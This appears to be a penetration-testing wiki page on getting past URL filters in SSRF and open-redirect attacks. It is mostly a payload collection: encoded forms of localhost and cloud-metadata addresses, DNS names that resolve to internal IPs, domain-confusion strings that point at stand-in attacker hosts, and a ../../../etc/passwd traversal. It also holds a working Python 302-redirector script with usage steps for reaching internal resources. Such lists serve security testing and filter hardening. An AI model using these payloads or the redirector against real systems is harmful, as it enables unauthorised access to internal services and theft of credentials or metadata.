# Bypass URL Filtration

## Localhost

```bash
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```

{% embed url="https://github.com/e1abrador/Burp-Encode-IP" %}

<figure><img src="../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>

## Domain Parser

```
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
```

```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

## Domain Confusion&#x20;

{% code overflow="wrap" %}
```http
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com%25%32%33@{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\@{domain}
https://attacker{domain}
https://attacker.com\anything@{domain}/
https://attacker.com/.{domain]
https://attakcer.com\[{domain}]
https://attacker.com%ff@{DOMAIN}%2F
https://attacker.com%bf:@{domain}%2F
https://attacker.com%252f@{domain}%2F
https://attackjer.com%0a%2523.{domain}
https://attacker.com://{domain}
androideeplink://attacker.com\@{domain}
androideeplink://a@{domain}:@attacker.com
androideeplink://{domain}
https://{domain}.attacker.com\@{domain}
https://{domain}%252f@attacker.com%2fpath%2f%3
//attacker.com:%252525252f@{domain}
/%09/attacker.com
attacker.com%09{domain}
attacker.com\u0000@{domain}
attacker.com%00{domain}
/\attacker.com
https://attacker.comğ.{domain}
https://attacker.com\udfff@{domain} 
https://attacker.com?.{domain}
https://evil.com/test@example.com
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

#Parameter pollution
next={domain}&next=attacker.com
```
{% endcode %}

## Paths and Extensions Bypass

```
https://metadata/vulerable/path#/expected/path
https://metadata/vulerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
../../../etc/passwd%00.png
```

## Bypassing IP Regex Using Automated Tools

{% embed url="https://0xacb.com/2022/11/21/recollapse/" %}

This technique has been presented on [BSidesLisbon 2022](https://bsideslisbon.org/)

**Blog post**: [https://0xacb.com/2022/11/21/recollapse/](https://0xacb.com/2022/11/21/recollapse/)

**Slides**:

* [nahamcon\_2022\_eu\_till\_recollapse.pdf](https://github.com/0xacb/recollapse/blob/main/slides/nahamcon\_2022\_eu\_till\_recollapse.pdf)
* [bsideslisbon\_2022\_till\_recollapse.pdf](https://github.com/0xacb/recollapse/blob/main/slides/bsideslisbon\_2022\_till\_recollapse.pdf)

**Videos**:

* [NahamCon 2022 EU](https://www.youtube.com/watch?v=1eLTMKWciic)
* [BSidesLisbon 2022](https://www.youtube.com/watch?v=nb91qhj5cOE)

**Normalization table**: [https://0xacb.com/normalization\_table](https://0xacb.com/normalization\_table)

This script demonstrates a technique to bypass SSRF filters using an HTTP redirect. Here's a summary and explanation:

## Bypass via redirect

```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("Usage: {} <port_number> <url>".format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

#### Explanation:

* **Problem**: Some servers filter SSRF attempts by checking the URL parameters in requests. For example, a server might block direct requests to internal IP addresses or certain protocols.
* **Bypass Idea**: The server might not filter the redirected response from an external server, allowing the attacker to indirectly access restricted IPs or protocols.

#### How It Works:

* The Python script creates a simple HTTP server that listens on a specified port.
* When the server receives a GET request, it responds with a 302 redirect status, pointing to a URL passed as an argument.
* This redirect can point to an internal IP address (e.g., `127.0.0.1`) or use a protocol that might otherwise be blocked (e.g., `gopher`).

#### Usage:

1.  **Run the Script**: Start the Python server with the desired port and the target URL for redirection:

    ```bash
    python3 redirector.py 8000 http://127.0.0.1/
    ```
2. **Trigger SSRF**: Send an SSRF request to the vulnerable server with the URL of the Python server. The vulnerable server will follow the redirect, potentially bypassing the filter and accessing the internal resource.

**Resource:**

{% embed url="https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530" %}

## Blackslash-trick <a href="#blackslash-trick" id="blackslash-trick"></a>

> The _backslash-trick_ exploits a difference between the [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing) and [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B). While RFC3986 is a general framework for URIs, WHATWG is specific to web URLs and is adopted by modern browsers. The key distinction lies in the WHATWG standard's recognition of the backslash (`\`) as equivalent to the forward slash (`/`), impacting how URLs are parsed, specifically marking the transition from the hostname to the path in a URL.

<figure><img src="../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://url.spec.whatwg.org/#url-parsing" %}

{% embed url="https://datatracker.ietf.org/doc/html/rfc3986#appendix-B" %}

## Other Resources

{% embed url="https://claroty.com/team82/research/exploiting-url-parsing-confusion" %}

\


<figure><img src="https://claroty.com/img/asset/YXNzZXRzL2ltcG9ydGVkLWltYWdlcy9mYzRlMjkyNWRhOWYwMzdlYjAyZDU5MzMxY2Y5Yzg2My1TdW1tYXJ5X1RhYmxlLmpwZw==/fc4e2925da9f037eb02d59331cf9c863-Summary_Table.jpg?fm=webp&#x26;fit=crop&#x26;s=e23763a3b4b199e811f057fa4365c8db" alt="URL Parser Summary Table" height="1614" width="1200"><figcaption></figcaption></figure>

{% embed url="https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md" %}

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass?source=post_page-----ac682dd17722--------------------------------#domain-confusion" %}
